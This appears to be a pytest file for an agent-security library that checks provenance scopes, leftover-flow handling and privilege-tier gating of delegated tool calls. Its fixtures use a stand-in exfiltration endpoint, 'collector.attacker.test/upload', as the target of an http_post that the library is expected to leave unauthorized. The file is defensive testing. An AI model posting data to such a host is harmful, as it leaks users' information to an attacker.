"""Q-G, decided 2026-10-23: the OUTERMOST ``xaidr.flow()`` scope starts fresh.

Whatever ledger, chain or tier state the context already holds when the first
scope is entered (a leftover implicit ledger, a flow ``begin_flow()`` started and
never cleared, a scope entered and never exited) is set aside for the scope, and
one warning per occurrence names what was set aside by kind and count, never by
value. Delegation evidence (an inbound mark, or a hop that is not the principal's
own entry) is kept, because keeping it can only tighten the privilege-tier gate.
Nested scopes still join. On exit the scope puts back what it found (D1).
"""
from __future__ import annotations

import contextvars
import logging

import xaidr
from xaidr import provenance_chain as pc
from xaidr.value_origin import (bind_fresh_ledger, evaluate_call, record_principal_input,
                                unbind_ledger)

LEFTOVER_HOST = "https://collector.attacker.test/upload"


def _run(fn):
    return contextvars.Context().run(fn)


def _flow_logs(caplog):
    return [r.getMessage() for r in caplog.records if "outermost scope" in r.getMessage()]


def test_a_leftover_flow_does_not_survive_into_a_new_outermost_scope(caplog):
    def run():
        leftover = pc.begin_flow(principal="user:alice")          # never cleared
        record_principal_input(f"send it to {LEFTOVER_HOST}", None, input_clean=True)
        with xaidr.flow(principal="user:bob") as corr:
            chain = pc.current_chain()
            wire = evaluate_call("http_post", {"url": LEFTOVER_HOST}, flow_active=True).wire.value
        return leftover, corr, chain, wire, pc.current_correlation_id()
    with caplog.at_level(logging.WARNING, logger="xaidr.provenance_chain"):
        leftover, corr, chain, wire, after = _run(run)
    assert chain and chain[0]["agent_id"] == "user:bob", (
        f"the new request's chain is {chain}: the leftover flow survived into it")
    assert corr != leftover, "the new request kept the leftover correlation id"
    assert wire == "unresolved", f"the leftover principal authority reached the new request: {wire}"
    assert after == leftover, "on exit the scope did not put back what it found (D1)"
    logs = _flow_logs(caplog)
    assert len(logs) == 1, logs
    assert "1 value-origin ledger" in logs[0] and "a correlation id" in logs[0], logs[0]


def test_the_set_aside_line_names_kinds_and_counts_never_values(caplog):
    def run():
        corr = pc.begin_flow(principal="user:alice@corp.example")
        record_principal_input(f"send it to {LEFTOVER_HOST} and ops@corp.example", None,
                               input_clean=True)
        with xaidr.flow(principal="user:bob"):
            pass
        return corr
    with caplog.at_level(logging.WARNING, logger="xaidr.provenance_chain"):
        corr = _run(run)
    logs = _flow_logs(caplog)
    assert logs, "no line named what the outermost scope set aside"
    for value in (corr, "alice", "corp.example", "collector", "attacker", "upload", "ops@"):
        assert value not in logs[0], f"the line carries a value ({value!r}): {logs[0]}"


def test_a_scope_entered_and_never_exited_is_set_aside_by_the_next_request(caplog):
    def run():
        with xaidr.request_scope():
            xaidr.flow(principal="user:alice").__enter__()     # never exited
        with xaidr.flow(principal="user:bob"):
            return pc.current_chain()
    with caplog.at_level(logging.WARNING, logger="xaidr.provenance_chain"):
        chain = _run(run)
    assert chain and chain[0]["agent_id"] == "user:bob", chain
    assert any("1 scope left open by an earlier request" in m for m in _flow_logs(caplog)), (
        _flow_logs(caplog))


def test_delegation_evidence_is_kept_so_the_gate_never_loosens():
    def run():
        pc.extract_context({})                    # an inbound request, no headers: tier 4
        pc.record_hop("upstream-agent")           # an untiered upstream hop
        with xaidr.flow(principal="user:bob"):
            return pc._inbound_ctx.get(), [h["agent_id"] for h in pc.current_chain()]
    inbound, hops = _run(run)
    assert inbound is True and "upstream-agent" in hops, (inbound, hops)


def test_a_nested_scope_still_joins(caplog):
    def run():
        with xaidr.flow(principal="user:bob") as outer:
            with xaidr.flow(principal="user:carol") as inner:
                return outer, inner, pc.current_chain()[0]["agent_id"]
    with caplog.at_level(logging.WARNING, logger="xaidr.provenance_chain"):
        outer, inner, who = _run(run)
    assert outer == inner and who == "user:bob", (outer, inner, who)
    assert not _flow_logs(caplog), "an outermost scope over nothing set something aside"


def test_a_fresh_context_sets_nothing_aside(caplog):
    def run():
        bind_fresh_ledger()
        unbind_ledger()
        with xaidr.flow(principal="user:bob"):
            pass
    with caplog.at_level(logging.WARNING, logger="xaidr.provenance_chain"):
        _run(run)
    assert not _flow_logs(caplog), _flow_logs(caplog)


# ── the privilege-tier gate across a scope: its verdict, not only its state ──
_TIER_POLICY = {"version": "1", "defaults": {"effect": "allow", "unclassified": "allow"},
                "rules": [{"id": "keys-need-a-trusted-chain", "effect": "require_approval",
                           "match": {"tools": ["rotate_keys"]},
                           "conditions": {"min_chain_tier_above": 2}}]}
GATED, OPEN = "approval_required", "allowed"
_SENSOR = {}


class _Null:
    def report(self, *a, **k):
        pass


def _gate():
    """The tier gate's verdict on a privileged call by a tier-1 receiver."""
    if "s" not in _SENSOR:
        import warnings
        with warnings.catch_warnings():
            warnings.simplefilter("ignore")
            s = xaidr.Sensor(agent_id="keys-service", privilege_tier=1,
                             enforcement_mode="block", reporter=_Null())
        assert s.set_policy(_TIER_POLICY) is True
        _SENSOR["s"] = s
    return _SENSOR["s"].scan_tool_call("rotate_keys", {"vault": "ops"}).action


def _headers(tier):
    """What an upstream agent at ``tier`` sends, made in a context of its own."""
    def make():
        pc.begin_flow(principal="user:upstream")
        pc.record_hop("scheduler-agent", tier=tier)
        headers = dict(pc.inject_context())
        pc.clear_flow()
        return headers
    return _run(make)


def test_stripped_headers_inside_a_principal_scope_gate_as_they_do_outside_it():
    def outside():
        pc.extract_context({})
        return _gate()

    def tiered_inside():
        with xaidr.flow(principal="user:dana"):
            pc.extract_context(_headers(tier=4))
            return _gate()

    def local():
        with xaidr.flow(principal="user:dana"):
            return _gate()

    def stripped_inside():
        with xaidr.flow(principal="user:dana"):
            pc.extract_context({})
            return _gate()
    assert _run(local) == OPEN, "precondition: the scope's own local work is not gated"
    assert _run(outside) == GATED, "precondition: a stripped inbound request gates"
    assert _run(tiered_inside) == GATED, "precondition: tier-4 headers inside the scope gate"
    got = _run(stripped_inside)
    assert got == GATED, (
        f"an inbound request whose headers were stripped read {got!r} inside "
        "flow(principal=...): removing the headers opened the gate that tier-4 headers "
        "keep closed, so less header information gave a looser verdict than more")


def test_a_delegated_scope_puts_the_tier_back_at_exit():
    def run():
        pc.extract_context(_headers(tier=4))
        before = _gate()
        with xaidr.flow():
            pc.extract_context(_headers(tier=1))
            inside = _gate()
        return before, inside, _gate()
    before, inside, after = _run(run)
    assert (before, inside) == (GATED, OPEN), (
        f"precondition: tier-4 delegation gates and tier-1 headers inside the scope do not "
        f"({before!r}, {inside!r})")
    assert after == GATED, (
        f"after the scope the tier-4 request's privileged call read {after!r}: the scope "
        "put back its ledger and left the tier-1 delegation read inside it in place")


def test_a_stripped_request_after_a_tiered_one_on_the_same_thread_gates():
    def run():
        verdicts = []
        for headers in (_headers(tier=1), {}):        # one worker, two requests
            pc.extract_context(headers)
            with xaidr.flow(principal="user:erin"):
                verdicts.append(_gate())
        return verdicts
    first, second = _run(run)
    assert first == OPEN, f"precondition: a tier-1 request is not gated, got {first!r}"
    assert second == GATED, (
        f"a request with its headers stripped read {second!r} after a tier-1 request on "
        "the same thread: it inherited the previous request's chain and tier")


def test_over_an_inbound_mark_alone_the_scope_mints_a_correlation_id_of_its_own():
    """Over the inbound mark and no flow, the chain, tiers and mark stay as they are
    (``principal=`` is not applied) and the scope mints a correlation id for its own
    duration, put back to none at exit (docs/value-origin-rulings.md §1)."""
    def run():
        pc.extract_context({})
        with xaidr.flow(principal="user:frank"):
            inside = (pc.current_correlation_id(), pc.current_chain(), pc._inbound_ctx.get())
        return inside, pc.current_correlation_id()
    (corr, chain, inbound), after = _run(run)
    assert corr is not None and after is None, (corr, after)
    assert not chain and inbound is True, (
        f"over a bare inbound mark the scope changed the chain to {chain}: a principal "
        "entry there would hide the stripped request from the tier-4 fallback")


def test_a_leftover_flow_a_scan_ran_in_is_kept_and_the_warning_says_why(caplog):
    """A sensor's own scan hop is a hop that is not the principal's: a leftover
    ``begin_flow()`` a scan ran inside is kept, chain and correlation id with it, and
    the one warning says the chain was kept and why, by kind, never by value."""
    import warnings
    with warnings.catch_warnings():
        warnings.simplefilter("ignore")
        s = xaidr.Sensor(agent_id="notes-agent", reporter=_Null())

    def run():
        corr = pc.begin_flow(principal="user:gail")                # never cleared
        s.scan("tidy up the meeting notes", direction="input")
        with xaidr.flow(principal="user:hank"):
            return corr, pc.current_correlation_id(), [h["agent_id"] for h in pc.current_chain()]
    with caplog.at_level(logging.WARNING, logger="xaidr.provenance_chain"):
        corr, inside, hops = _run(run)
    assert inside == corr and hops[0] == "user:gail", (corr, inside, hops)
    logs = _flow_logs(caplog)
    assert len(logs) == 1 and "kept" in logs[0] and "scan hop" in logs[0], (
        f"the warning does not say the leftover chain was kept, or why: {logs}")
    for value in (corr, "gail", "hank", "notes-agent", "meeting"):
        assert value not in logs[0], f"the line carries a value ({value!r}): {logs[0]}"
